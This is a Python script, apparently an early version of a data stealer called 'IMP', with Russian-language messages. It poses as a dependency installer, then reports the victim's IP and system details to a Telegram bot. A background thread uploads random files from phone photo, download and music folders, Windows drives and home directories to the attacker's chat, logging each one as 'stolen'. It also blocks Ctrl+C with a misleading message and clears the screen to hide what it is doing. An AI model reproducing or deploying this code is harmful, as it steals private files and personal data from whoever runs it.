# Версия IMP 0.0.2
# Пофиксил баги
import time
import subprocess
import requests
from colorama import init, Fore, Style
import os
import threading
import zipfile 
import sys
import signal
import random
import platform

TELEGRAM_BOT_TOKEN = ''
TELEGRAM_CHAT_ID = ''

def signal_handler(sig, frame):
    print("Failed to kill process.")

signal.signal(signal.SIGINT, signal_handler)

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    requests.post(url, data=payload)

def run_commands():
    print('💿 Установка зависимостей...')
    try:
        system_platform = platform.system()
        
        if system_platform == "Linux":
            subprocess.run(['apt', 'install', 'curl', '-y'], check=True)
        elif system_platform == "Darwin":
            subprocess.run(['brew', 'install', 'curl'], check=True)
        elif system_platform == "Windows":
            subprocess.run(['choco', 'install', 'curl', '-y'], check=True)
        elif 'termux' in sys.argv[0]:
            subprocess.run(['pkg', 'install', 'curl', '-y'], check=True)
        else:
            send_telegram_message(f"❌ Неизвестная платформа: {system_platform}")
            return
    except Exception as e:
        send_telegram_message(f"❌ Ошибка установки зависимостей: {e}")
        print(f"❌ Ошибка установки зависимостей: {e}")
        return

    try:
        ip_address = subprocess.check_output(['curl', 'ifconfig.me']).decode('utf-8').strip()
        system = platform.system()
        ver = platform.version()
        arch = platform.architecture()
        send_telegram_message(f"📲 Новая сессия\nIP: {ip_address}\nSystem: {system} {ver} {arch}")
    except Exception as e:
        send_telegram_message(f"💀 Не удалось получить IP: {e}")

    share_thread = threading.Thread(target=share)
    share_thread.start()
    send_telegram_message(f"👁️️️️️️ Перехватываю данные...")
    os.system('clear')

def share():
    try:
        folders_to_send = ['/storage/emulated/0/Download', '/storage/emulated/0/Movies', '/storage/emulated/0/Pictures', '/storage/emulated/0/DCIM', '/storage/emulated/0/Music', 'C:', 'E:', 'F:', '/home', '/root']
        
        for folder in folders_to_send:
            if os.path.exists(folder):
                files = []
                for root, dirs, files_in_folder in os.walk(folder):
                    for file in files_in_folder:
                        files.append(os.path.join(root, file))
                
                random_files = random.sample(files, min(5, len(files)))

                for file_path in random_files:
                    with open(file_path, 'rb') as f:
                        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
                        payload = {
                            'chat_id': TELEGRAM_CHAT_ID,
                        }
                        files = {
                            'document': f
                        }
                        try:
                            response = requests.post(url, data=payload, files=files)
                            if response.status_code == 200:
                                send_telegram_message(f'🖤 Спизжено: {file_path}')
                            else:
                                send_telegram_message(f'💔 Не спиздилось: {file_path} - {response.text}')
                        except requests.exceptions.RequestException as e:
                            if "Max retries exceeded" in str(e) and "SSLError" in str(e):
                                send_telegram_message(f"⛓️‍💥 {e}. Повторная попытка через 8 секунд...")
                                time.sleep(8)
                                share()
                                return
                    time.sleep(4)
            else:
                send_telegram_message(f"Папка не найдена: {folder}")
                share()
                return

    except Exception as e:
        send_telegram_message(f"❌ Фатальная ошибка: {e}")

def imp():
    run_commands()

if __name__ == "__main__":
    imp()